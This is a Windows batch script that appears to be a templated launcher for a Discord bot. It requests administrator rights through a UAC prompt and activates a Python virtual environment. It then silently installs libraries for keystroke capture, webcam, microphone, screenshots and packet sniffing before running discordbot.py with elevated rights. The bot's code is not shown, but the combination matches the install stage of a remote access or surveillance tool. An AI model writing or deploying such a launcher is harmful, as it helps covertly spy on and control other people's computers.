@echo off
:: Check for elevated permissions
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with elevated permissions
)else (
    echo Requesting elevated permissions
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dp0run_discordbot.bat elevated' -Verb RunAs"
    exit /b
)

set "SCRIPTS_DIR=&&CURDIR&&"
set "VIRTUAL_ENV=&&VENVDIR&&"

:: Change to the directory of the script
cd /d %SCRIPTS_DIR% || (
    echo Failed to change directory to %SCRIPTS_DIR%
    start explorer %cd%
    exit /b 1
)

:: Debugging output
echo Current directory: %cd%
echo Activating virtual environment...

:: Activate the environment
if not exist "%VIRTUAL_ENV%\Scripts\activate.bat" (
    echo Virtual environment not found at %VIRTUAL_ENV%
    start explorer %cd%
    exit /b 1
)

rem This file is UTF-8 encoded, so we need to update the current code page while executing it
for /f "tokens=2 delims=:." %%a in ('"%SystemRoot%\System32\chcp.com"') do (
    set _OLD_CODEPAGE=%%a
)
if defined _OLD_CODEPAGE (
    "%SystemRoot%\System32\chcp.com" 65001 > nul
)

if not defined PROMPT set PROMPT=$P$G

if defined _OLD_VIRTUAL_PROMPT set PROMPT=%_OLD_VIRTUAL_PROMPT%
if defined _OLD_VIRTUAL_PYTHONHOME set PYTHONHOME=%_OLD_VIRTUAL_PYTHONHOME%

set "_OLD_VIRTUAL_PROMPT=%PROMPT%"
set "PROMPT=(venv) %PROMPT%"

if defined PYTHONHOME set _OLD_VIRTUAL_PYTHONHOME=%PYTHONHOME%
set PYTHONHOME=

if defined _OLD_VIRTUAL_PATH set PATH=%_OLD_VIRTUAL_PATH%
if not defined _OLD_VIRTUAL_PATH set _OLD_VIRTUAL_PATH=%PATH%

set "PATH=%VIRTUAL_ENV%\Scripts;%PATH%"
set "VIRTUAL_ENV_PROMPT=venv"

:: Debugging output
::echo PATH=%PATH%
::echo VIRTUAL_ENV=%VIRTUAL_ENV%

:END
if defined _OLD_CODEPAGE (
    "%SystemRoot%\System32\chcp.com" %_OLD_CODEPAGE% > nul
    set _OLD_CODEPAGE=
)
::exit /b 0

echo Virtual environment activated

:: Installing dependencies using PIP
echo Installing dependencies...

python.exe -m pip install pillow pynput python-dotenv opencv-python pyaudio scapy >nul 2>&1
python.exe -m pip install git+https://github.com/Rapptz/discord.py@master  >nul 2>&1
:: Debugging output
echo Running discordbot.py...
:: Run the discordbot.py script
discordbot.py

:: Debugging output
echo Finished running discordbot.py

